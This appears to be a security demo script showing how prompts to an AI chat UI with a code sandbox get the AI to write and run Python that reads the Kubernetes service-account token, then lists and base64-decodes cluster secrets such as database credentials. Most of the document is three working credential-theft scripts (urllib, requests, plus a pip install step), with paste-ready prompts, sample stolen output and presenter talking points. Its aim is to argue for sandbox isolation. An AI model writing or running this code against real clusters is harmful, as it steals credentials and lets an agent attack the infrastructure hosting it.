# Working Attacks Using Python Standard Library Only

**Problem**: The sandbox doesn't have `requests` module installed.

**Solution**: Use Python's built-in `urllib` instead.

---

## Attack 1: List All Secrets (Standard Library Version)

### Prompt for Chat UI:

```
Write code to list all secrets in the current Kubernetes namespace using 
the service account token. Use only Python standard library (urllib.request), 
no external packages.
```

### Expected AI Response:

```python
import urllib.request
import json
import ssl
import base64

# Read service account credentials
with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()

with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

# Kubernetes API endpoint
api_server = 'https://kubernetes.default.svc'
url = f'{api_server}/api/v1/namespaces/{namespace}/secrets'

# Create request with authorization header
req = urllib.request.Request(url)
req.add_header('Authorization', f'Bearer {token}')

# SSL context with CA certificate
ssl_context = ssl.create_default_context(cafile='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')

try:
    # Make the API call
    with urllib.request.urlopen(req, context=ssl_context) as response:
        data = json.loads(response.read().decode('utf-8'))
        
        secrets = data.get('items', [])
        print(f"Found {len(secrets)} secrets in namespace '{namespace}':")
        print("-" * 60)
        
        for secret in secrets:
            name = secret['metadata']['name']
            secret_type = secret.get('type', 'Opaque')
            print(f"📦 {name}")
            print(f"   Type: {secret_type}")
            
            # Highlight sensitive secrets
            if any(keyword in name.lower() for keyword in ['database', 'stripe', 'api', 'credentials', 'password', 'key']):
                print(f"   ⚠️  POTENTIALLY SENSITIVE")
            
            print("-" * 40)
            
except urllib.error.HTTPError as e:
    print(f"❌ HTTP Error {e.code}: {e.reason}")
    print(f"Access denied. Service account may not have permissions.")
except Exception as e:
    print(f"Error: {e}")
```

---

## Attack 2: Read Specific Secret (Standard Library Version)

### Prompt for Chat UI:

```
Write code to read the 'database-credentials' secret from Kubernetes 
and decode its base64 values. Use only Python standard library (urllib), 
no external packages. Use the service account token for authentication.
```

### Expected AI Response:

```python
import urllib.request
import json
import ssl
import base64

def read_secret(secret_name):
    # Read service account credentials
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
        token = f.read().strip()
    
    with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
        namespace = f.read().strip()
    
    # API endpoint for the specific secret
    api_server = 'https://kubernetes.default.svc'
    url = f'{api_server}/api/v1/namespaces/{namespace}/secrets/{secret_name}'
    
    # Create request with authorization
    req = urllib.request.Request(url)
    req.add_header('Authorization', f'Bearer {token}')
    
    # SSL context
    ssl_context = ssl.create_default_context(
        cafile='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
    )
    
    try:
        # Make the API call
        with urllib.request.urlopen(req, context=ssl_context) as response:
            data = json.loads(response.read().decode('utf-8'))
            
            print(f"✅ Successfully retrieved secret: {secret_name}")
            print("=" * 60)
            
            # Decode the secret data
            encoded_data = data.get('data', {})
            
            if not encoded_data:
                print("No data found in secret")
                return None
            
            print("🔓 Decoded secret values:")
            print("-" * 60)
            
            credentials = {}
            for key, encoded_value in encoded_data.items():
                # Decode from base64
                decoded_value = base64.b64decode(encoded_value).decode('utf-8')
                credentials[key] = decoded_value
                
                # Print with partial masking
                if len(decoded_value) > 6:
                    masked = decoded_value[:2] + '*' * (len(decoded_value) - 4) + decoded_value[-2:]
                else:
                    masked = '*' * len(decoded_value)
                
                print(f"  {key}: {masked}")
            
            print("-" * 60)
            print(f"⚠️  Successfully extracted {len(credentials)} credential values")
            
            return credentials
            
    except urllib.error.HTTPError as e:
        print(f"❌ HTTP Error {e.code}: {e.reason}")
        if e.code == 403:
            print("Access denied - service account lacks permissions (Kata protection?)")
        elif e.code == 404:
            print(f"Secret '{secret_name}' not found")
    except Exception as e:
        print(f"Error: {e}")
        return None

# Execute the attack
read_secret('database-credentials')
```

---

## Attack 3: Install Requests Then Attack (Package Installation)

### Prompt for Chat UI:

```
The requests library isn't available. First install it using pip, 
then list all secrets in the namespace using the service account token.
```

### Expected AI Response:

```python
import subprocess
import sys

# Install requests
print("Installing requests library...")
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', '--quiet'])
print("✅ Requests installed\n")

import requests

# Read credentials
with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()
with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

# API call
api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}
response = requests.get(
    f'{api_server}/api/v1/namespaces/{namespace}/secrets',
    headers=headers,
    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
)

if response.status_code == 200:
    secrets = response.json().get('items', [])
    print(f"Found {len(secrets)} secrets:")
    for s in secrets:
        print(f"  - {s['metadata']['name']}")
else:
    print(f"Error: {response.status_code}")
```

**What this demonstrates**:
- Sandboxes that allow pip can download arbitrary code
- Supply chain attack vector (malicious PyPI packages)
- Another reason to use Kata (limits blast radius)

---

## 🎯 Recommended Approach for Your Demo

### Use Attack 2 (Read database-credentials) with Standard Library:

**Why**:
- ✅ Works immediately (no dependencies)
- ✅ Most dramatic (shows actual passwords)
- ✅ Clean and professional
- ✅ Fast execution

**Prompt to paste**:
```
Write code to read the 'database-credentials' secret from Kubernetes 
and decode its base64 values. Use only Python standard library (urllib), 
no external packages. Use the service account token for authentication.
```

---

## Expected Results

### With Kata (Protected):
```
❌ HTTP Error 403: Forbidden
Access denied - service account lacks permissions (Kata protection?)
```

### With Runc (Vulnerable):
```
✅ Successfully retrieved secret: database-credentials
============================================================
🔓 Decoded secret values:
------------------------------------------------------------
  API_KEY: sk********************0j
  DB_HOST: pr**************************om
  DB_NAME: cu**********ta
  DB_PASSWORD: P@******************ss
  DB_USER: ap******in
  REDIS_PASSWORD: Re******************et
------------------------------------------------------------
⚠️  Successfully extracted 6 credential values
```

**💀 BOOM** - Database credentials stolen!

---

## 🎬 Talking Points

**When showing the urllib version**:
> "Notice I had to ask the AI to use standard library only. The sandbox 
> is minimal - it doesn't even have basic HTTP libraries installed.
> 
> But that doesn't stop the attack. The AI just adapted and used urllib instead.
> 
> This shows that security can't rely on limiting what packages are available.
> The attack surface is the Kubernetes API itself."

**When showing the pip install version** (optional):
> "Here's another attack vector - I asked the AI to install the package first.
> 
> Now we're downloading code from the internet (PyPI) and executing it in our 
> 'sandboxed' environment. Supply chain attacks, malicious packages, you name it.
> 
> With Kata, even if malicious code runs, it's isolated in the VM. Without Kata,
> you're executing untrusted code with full namespace access."

---

## ✅ Quick Test

Try this now in the Chat UI:

```
Write code to read the 'database-credentials' secret from Kubernetes 
and decode its base64 values. Use only Python standard library (urllib), 
no external packages. Use the service account token for authentication.
```

Then click "Run" and see what happens!
